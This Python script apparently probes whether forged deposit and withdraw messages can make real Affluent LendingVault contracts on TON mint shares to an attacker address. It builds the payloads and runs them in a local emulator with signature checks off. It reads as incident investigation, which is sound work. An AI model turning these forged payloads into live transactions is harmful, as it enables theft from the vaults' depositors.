#!/usr/bin/env python3
"""
DECISIVE live-path test: can a fresh attacker make an Affluent LendingVault MINT
shares via a forged `take_aggregated_data_deposit` (0xab7bef17) carrying a
caller-supplied amount? READ-ONLY (lite reads + local TVM).

On 2026-10-16 the affUSDTl master minted 1e16 affUSDTl to a fresh wallet; the
deposit flow's share-credit step is the `take_aggregated_data_deposit` handler.
"""
import base64, json, time
from tonpy.types import LiteClient, Address, Cell, CellBuilder, VmDict
from tonpy.tvm import Emulator
from tonpy.autogen.block import Account, ShardAccount

ATTACKER = "0:34461ba017e4799eeee0628521e505226ef405e087cabb765eb50a882e5550a2"
# vault -> its underlying asset address
VAULTS = {
    "LV_factorialTON":  ("EQADQ6JcK0NMuNM5uwCcS9bjcn2RTvcxYIZjNlhIhywUrfBN", "0:1a53eafca110a44bc0df2ce313f3e07027bbe10aa24a6bf3a367ab8671e41642"),  # AffluentTON
    "LV_factorialUSDT": ("EQAGtgnr1G0XDilGURcOB3pUhl-Lo__J-TaJP0K4ey8cuSaW", "0:b113a994b5024a16719f69139328eb759596c38a25f59028b146fecdc3621dfe"),  # USDT
    "LV_affluentUSDT":  ("EQAc65JgiTwcoC3M1VYnQcM2Ivq4DTWOtyY2k2EaBuXsKRAZ", "0:b113a994b5024a16719f69139328eb759596c38a25f59028b146fecdc3621dfe"),
}

def coins(b, v):
    if v == 0: b.store_uint(0, 4); return
    nb = (v.bit_length() + 7) // 8
    b.store_uint(nb, 4); b.store_uint(v, nb * 8)

def _data(acc):
    if acc is None or not hasattr(acc, "storage"): return None
    stt = acc.storage.state
    if not hasattr(stt, "x"): return None
    d = stt.x.data
    return None if d is None else getattr(d, "value", d)
def data_of_account(c): return _data(Account().cell_unpack(c, rec_unpack=True))
def data_of_shard(c):
    sa = ShardAccount().cell_unpack(c, rec_unpack=True)
    return _data(sa.account if sa is not None else None)

def body_take_deposit(qid, index, asset, frm, amount):
    # take_aggregated_data_deposit#ab7bef17 query_id:uint64 index:Coins
    #   asset_data:(Maybe ^Cell) pool_data:(Maybe ^Cell) vault_data:(Maybe ^Cell)
    #   context_payload:DepositContext(deposit_context#f9471134 asset_address from_address amount forward_ton_amount forward_payload)
    b = CellBuilder(); b.store_uint(0xab7bef17, 32); b.store_uint(qid, 64); coins(b, index)
    b.store_bool(False); b.store_bool(False); b.store_bool(False)
    b.store_uint(0xf9471134, 32)
    b.store_address(Address(asset)); b.store_address(Address(frm))
    coins(b, amount); coins(b, 0); b.store_bool(False)
    return b.end_cell()

def body_take_withdraw(qid, index, asset, frm, amount):
    b = CellBuilder(); b.store_uint(0xd9cf8c91, 32); b.store_uint(qid, 64); coins(b, index)
    b.store_bool(False); b.store_bool(False); b.store_bool(False)
    b.store_uint(0xcb03bfaf, 32)
    b.store_address(Address(asset)); b.store_address(Address(frm))
    coins(b, amount); coins(b, 0); b.store_bool(False)
    return b.end_cell()

def build_msg(src, dest, value_nano, body, lt, now):
    m = CellBuilder()
    m.store_bool(False); m.store_bool(True); m.store_bool(True); m.store_bool(False)
    m.store_address(Address(src)); m.store_address(Address(dest))
    coins(m, value_nano); m.store_bool(False); coins(m, 0); coins(m, 0)
    m.store_uint(lt, 64); m.store_uint(now, 32)
    m.store_bool(False); m.store_bool(True); m.store_ref(body)
    return m.end_cell()

def retry(fn, n=8):
    last = None
    for _ in range(n):
        try: return fn()
        except Exception as e: last = e; time.sleep(1.5)
    raise last

def main():
    lc = LiteClient(mode="roundrobin", timeout=4, num_try=8)
    blk = retry(lambda: lc.get_masterchain_info_ext().last); now = lc.get_time()
    _, cfgraw = retry(lambda: lc.get_config_all(blk))
    cfg = VmDict(32)
    for k, cs in cfgraw.get_iter():
        if k != 43: cfg.set(k, cs)

    res = {"block_seqno": blk.id.seqno, "tests": {}}
    for name, (vaddr, asset) in VAULTS.items():
        st = retry(lambda: lc.get_account_state(Address(vaddr), blk))
        lt = st.last_trans_lt + 1
        ss = st.to_shard_state()
        db = data_of_account(ss.begin_parse().load_ref())
        hb = db.get_hash()
        for tag, mk in [
            ("take_dep_1e16", lambda: body_take_deposit(1, 0, asset, ATTACKER, 10**16)),
            ("take_dep_1e18", lambda: body_take_deposit(1, 0, asset, ATTACKER, 10**18)),
            ("take_wd_1e16",  lambda: body_take_withdraw(1, 0, asset, ATTACKER, 10**16)),
        ]:
            key = f"{name}::{tag}"
            msg = build_msg(ATTACKER, vaddr, 1_500_000_000, mk(), lt, now)
            em = Emulator(cfg); em.set_ignore_chksig(True)
            try:
                ok = em.emulate_transaction(ss, msg, now, lt)
                da = data_of_shard(em.account.to_cell())
                ha = da.get_hash() if da is not None else None
            except Exception as e:
                res["tests"][key] = {"error": repr(e)}; print(f"[{key}] ERR {e!r}"); continue
            ch = ha != hb
            res["tests"][key] = {"ok": ok, "data_changed": ch, "before": hb, "after": ha}
            print(f"[{key}] ok={ok} data_changed={ch}")
            if ch and da is not None:
                open(f"/tmp/opencode/aff/after_take_{name}_{tag}.boc","wb").write(base64.b64decode(da.to_boc()))
    json.dump(res, open("/tmp/opencode/aff/emu_take_results.json","w"), indent=1)
    print("DONE")

if __name__ == "__main__":
    main()
